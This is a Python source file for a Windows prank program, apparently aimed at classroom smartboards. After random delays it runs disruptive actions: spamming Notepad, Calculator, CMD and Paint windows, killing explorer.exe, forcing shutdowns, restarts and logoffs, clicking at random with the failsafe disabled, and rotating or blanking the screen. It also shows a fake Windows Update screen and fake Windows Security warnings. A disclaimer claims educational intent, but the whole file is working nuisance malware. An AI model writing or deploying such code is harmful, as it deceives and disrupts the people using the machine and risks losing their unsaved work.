"""
=========================================================
UYARI / WARNING

Bu yazılım eğitim, araştırma ve kişisel deney amacıyla
oluşturulmuştur.

Bu program bazı sistem etkileşimleri gerçekleştirebilir.
Yalnızca size ait veya çalıştırma izniniz olan sistemlerde
kullanın.

Geliştirici, yazılımın yanlış kullanımından veya oluşabilecek
zararlardan sorumlu değildir.

---------------------------------------------------------

This software was created for educational, research, and
personal experimentation purposes.

This program may perform system interactions.
Use it only on systems you own or have explicit permission
to run it on.

The developer is not responsible for misuse of this software
or any damages caused by improper usage.

=========================================================
"""

import tkinter as tk
import pygetwindow as gw
from tkinter import messagebox
from PIL import Image, ImageTk
from threading import Thread
import subprocess, pyautogui, time, tempfile, random, os, webbrowser

try:
    root = tk.Tk()
    root.withdraw()
except:
    pass

typeX = 1
def createRoot():
    try:
        global root
        root = tk.Tk()
        root.withdraw()
    except:
        pass
    
try:
    if random.randint(1, 3) != 1:
        if typeX == 2:
                os.system("explorer shell:MyComputerFolder")
        elif typeX == 3:
            url ='https://www.google.com'
            webbrowser.open(url)
except:
    pass


"""
[>_]
Akilli-Tahta-Fatihi
by Ni
for Win10 x64
https://github.com/bi-Ni-ary/
"""


startGenome0 = [8, 30]
genome0 = startGenome0
genome1 = [15,                                      #hiç
           5,                                       #win def
           50,                                      #not
           45,                                      #calc
           76,                                      #masaüstü
           75,                                      #pencere kapat
           30,                                      #kapat
           36,                                      #yeniden başlat
           4,                                       #system32
           75,                                      #tıklama
           54,                                      #cmd
           8,                                       #google yt
           75,                                      #explorer
           79,                                      #ekranı döndür
           67,                                      #hata
           53,                                      #alt f4
           90,                                      #ekran görüntüsü troll
           43,                                      #paint
           65,                                      #ekran karartma
           80,                                      #başlat menüsü
           40,                                      #sahte güncellenme ekranı
           60,                                      #sor ve kapat
           60,                                      #oturumdan çık
           1                                        #Ni
            ]

def volumeFull():
    try:
        for _ in range(100):
            Thread(target=lambda : pyautogui.hotkey('volumeup')).start()
    except:
        return 0
    
def volumeMute():
    try:
        for _ in range(100):
            Thread(target=lambda : pyautogui.hotkey('volumedown')).start()
    except:
        return 0

def goToDesktop():
    try:
        windows = gw.getWindowsWithTitle('')
        for window in windows:
            if not window.isMinimized:
                window.minimize()
    except:
        pass
    finally:
        pyautogui.hotkey('win', 'd')
        
def closeWindows():
    windows = gw.getAllWindows()
    for window in windows:
        try:
            window.close()
        except:
            pass

      
while True:
    time.sleep(random.uniform(genome0[0] * 60.0, genome0[1] * 60.0))

    while True:
        x = random.randint(0, len(genome1) - 1)
        if random.random() * 100 < genome1[x]:
            break

    try:
        
        match x:
            case 0: # Hiçbir şey yapma
                pass
            
            case 1:  # Windows Defender
                os.system("start windowsdefender:")

            case 2:  # Notepad spam
                try:
                    for _ in range(random.randint(40, 400)):
                        subprocess.Popen(["notepad"])
                except:
                    pass

            case 3:  # Hesap makinesi spam
                try:
                    for _ in range(random.randint(50, 350)):
                        subprocess.Popen(["calc"])
                except:
                    pass

            case 4:  # Masaüstüne git
                for i in range(random.randint(2, 6)):
                    goToDesktop()
                    time.sleep(random.uniform(1.5, 4.5))

            case 5:  # Pencereleri kapat
                closeWindows()

            case 6:  # Kapat
                Thread(target=goToDesktop).start()
                Thread(target=closeWindows).start()
                os.system("shutdown /s /t 0")

            case 7:  # Yeniden başlat
                Thread(target=volumeFull).start()
                messagebox.showwarning("Windows Güvenliği", "Cihazınızın yeniden başlatılması gerekiyor.")
                Thread(target=goToDesktop).start()
                Thread(target=closeWindows).start()
                os.system("shutdown /r /t 0")

            case 8:  # System32 klasörünü aç
                subprocess.run(['explorer', r'C:\Windows\System32'])

            case 9:  # Ekrana rastgele tıklamalar
                try:
                    pyautogui.FAILSAFE = False
                    screenWidth, screenHeight = pyautogui.size()
                    
                    for _ in range(random.randint(100, 350)):
                        x = random.randint(0, screenWidth - 1)
                        y = random.randint(0, screenHeight - 1)
                        pyautogui.click(x, y)
                        time.sleep(random.uniform(0, random.uniform(1, 2)))
                except:
                    pass
                finally:
                    pyautogui.FAILSAFE = True

            case 10:  # CMD spam
                for i in range(random.randint(5, 11)):
                    os.system("start cmd")
                    time.sleep(random.uniform(2.5, 8.0))

            case 11:  # Google veya YouTube aç
                url = random.choice(['https://www.google.com', 'https://www.youtube.com'])
                webbrowser.open(url)

            case 12:  # Explorer'ı çökert
                if random.randint(1, 20) == 1:
                    os.system("taskkill /f /im explorer.exe")
                else:
                    wait = lambda : time.sleep(random.uniform(0.5, 2.0))
                    for i in range(random.randint(5, 10)):
                        os.system("taskkill /f /im explorer.exe")
                        wait()
                        os.system("start explorer.exe")
                        wait()

            case 13:  # Ekranı döndür
                wait = lambda : time.sleep(random.uniform(0.3, 0.6))
                for _ in range(random.randint(3, 14)):
                    pyautogui.hotkey('ctrl', 'alt', 'left')
                    wait()
                    pyautogui.hotkey('ctrl', 'alt', 'down')
                    wait()
                    pyautogui.hotkey('ctrl', 'alt', 'right')
                    wait()
                    pyautogui.hotkey('ctrl', 'alt', 'up')
                    wait()
                    time.sleep(random.uniform(0.6, 0.95))

            case 14:  # Hata penceresi spamla
                Thread(target=volumeFull).start()
                try:
                    for i in range(random.randint(5, 15)):
                        messagebox.showerror("Windows", "HATA: unknown error!")
                except:
                    pass
                    
            case 15:  # Alt + F4 spamla
                for i in range(random.randint(2, 6)):
                    pyautogui.hotkey('alt', 'f4')
                    time.sleep(random.uniform(0.5, 1.5))
                    
            case 16:  # Ekran görüntüsü troll
                try:
                    Thread(target=volumeMute).start()
                    pyautogui.FAILSAFE = False
                    ss = pyautogui.screenshot()
                    tempDir = tempfile.gettempdir()
                    tempPath = os.path.join(tempDir, "fakeDesktop.png")
                    ss.save(tempPath)

                    screen = tk.Toplevel(root)
                    screen.title("Windows")
                    screen.attributes('-fullscreen', True)
                    screen.configure(bg="black")
                    screen.attributes('-topmost', 1)

                    img = Image.open(tempPath)
                    tkImg = ImageTk.PhotoImage(img)

                    label = tk.Label(screen, image=tkImg)
                    label.image = tkImg
                    label.pack()

                    screen.lift()
                    screen.focus_force()
                    screen.protocol("WM_DELETE_WINDOW", root.destroy)
                    
                    if random.randint(1, 7) == 1:
                        screen.mainloop()
                        
                    else:
                        for i in range(random.randint(300, 1800)):
                            if not screen.winfo_exists():
                                break
                            screen.update()
                            time.sleep(0.1)
                        Thread(target=volumeFull).start()
                        pyautogui.hotkey('win', 'ctrl', 'shift', 'b')
                        screen.destroy()

                    createRoot()
                    img.close()
                    pyautogui.FAILSAFE = True
                    os.remove(tempPath)
                    
                    time.sleep(180)
                except:
                    pass
                
            case 17:  # Paint spamla
                try:
                    for i in range(random.randint(25, 55)):
                        subprocess.Popen(["mspaint"])
                except:
                    pass
                    
            case 18:  # Ekranı karartma
                for i in range(random.randint(4, 8)):
                    pyautogui.hotkey('win', 'ctrl', 'shift', 'b')
                    time.sleep(random.uniform(4, 8))
                    
            case 19:  # Başlat menüsü açma
                for i in range(random.randint(14, 70)):
                    pyautogui.hotkey('win')
                    time.sleep(random.uniform(0.3, 1.0))
                    
            case 20:  # Sahte Güncellenme Ekranı 
                try:
                    Thread(target=volumeMute).start()
                    Thread(target=goToDesktop).start()
                    Thread(target=closeWindows).start()
                    Thread(target=lambda : pyautogui.hotkey('alt', 'f4')).start()
                    
                    wait = (12500, 22000)
                    loading = [0]

                    updateWin = tk.Toplevel(root)
                    updateWin.title("Windows Update")
                    updateWin.attributes('-fullscreen', True)
                    updateWin.configure(bg="#0085ec", cursor="none")
                    updateWin.attributes('-topmost', 1)

                    screenWidth = updateWin.winfo_screenwidth()
                    screenHeight = updateWin.winfo_screenheight()

                    frame = tk.Frame(updateWin, bg="#0085ec")
                    frame.place(relx=0.5, rely=0.45, anchor="center")

                    try:
                        gif = Image.open("assets/loading.gif")
                        gifFrames = []
                        for frameIndex in range(gif.n_frames):
                            gif.seek(frameIndex)
                            img = gif.copy().resize((100, 100))
                            img.putalpha(253)
                            gifFrames.append(ImageTk.PhotoImage(img))
                    except:
                        gifFrames = []

                    gifLabel = tk.Label(frame, bg="#0085ec")
                    if gifFrames:
                        gifLabel.config(image=gifFrames[0])
                    gifLabel.pack(pady=10)

                    label1 = tk.Label(frame, text="Güncelleştirmeler üzerinde çalışılıyor", font=("Segoe UI", 15), bg="#0085ec", fg="#fff")
                    label1.pack()
                    
                    label2 = tk.Label(frame, text=f"%{loading[0]} tamamlandı", font=("Segoe UI", 15), bg="#0085ec", fg="#fff")
                    label2.pack()
                    
                    label3 = tk.Label(frame, text="Bilgisayarınızı kapatmayın", font=("Segoe UI", 15), bg="#0085ec", fg="#fff")
                    label3.pack()

                    def updateProgress():
                        updateWin.deiconify()
                        if loading[0] < 100:
                            if loading[0] >= 97:
                                loading[0] += 1
                                delay = random.randint(wait[0] * 4, wait[1] * 5)
                            elif loading[0] < 88:
                                loading[0] += random.randint(1, random.randint(2, 3))
                                delay = random.randint(wait[0], wait[1])
                            else:
                                loading[0] += random.randint(1, random.randint(1, 2))
                                delay = random.randint(wait[0] * 3, wait[1] * 3)

                            if loading[0] > 100:
                                loading[0] = 100

                            label2.config(text=f"%{loading[0]} tamamlandı")
                            updateWin.update()
                            updateWin.after(delay, updateProgress)
                        else:
                            loading[0] = 100
                            label2.config(text=f"%100 tamamlandı")
                            updateWin.update()
                            time.sleep(2)
                            os.system("shutdown /r /t 0")

                    def animateGIF(idx=0):
                        if gifFrames:
                            gifLabel.config(image=gifFrames[idx])
                            updateWin.after(25, lambda: animateGIF((idx + 1) % len(gifFrames)))

                    if gifFrames:
                        animateGIF()
                    updateProgress()
                    updateWin.protocol("WM_DELETE_WINDOW", root.destroy)
                    updateWin.mainloop()
                    createRoot()
                    time.sleep(90)
                    
                except:
                    pass
                
            case 21:  # Sor ve Kapat
                result = messagebox.askyesno("Windows", "Bilgisayarınız kapatılsın mı?")
                if not result:
                    Thread(target=goToDesktop).start()
                    Thread(target=closeWindows).start()
                    os.system("shutdown /s /t 0")
                time.sleep(30)
                    
            case 22:  # Oturumdan çık
                os.system("shutdown /l")
                        
            case 23:  # Ni Penceresi
                Ni = tk.Toplevel(root)
                Ni.title(">_ Ni")
                
                l = random.randint(400, 700)
                Ni.geometry(f"{l}x{l}")
                
                if random.randint(1, 10) == 1:
                    Ni.attributes('-fullscreen', True)
                Ni.configure(bg="black")
                label = tk.Label(Ni, text=">_ Ni", fg="white", bg="black", font=("Courier", 50))
                label.pack(expand=True)
                Ni.attributes("-topmost", True)
                Ni.protocol("WM_DELETE_WINDOW", root.destroy)
                Ni.mainloop()
                createRoot()

            
        if genome0 == startGenome0 or random.randint(1, 3) == 1:
            if random.randint(1, 15) == 1:
                genome0 = [0, 1]
            elif random.randint(1, 5) == 1:
                genome0 = [6, 10]
            else:
                genome0 = [4, 8]

    except Exception as e:
        pass


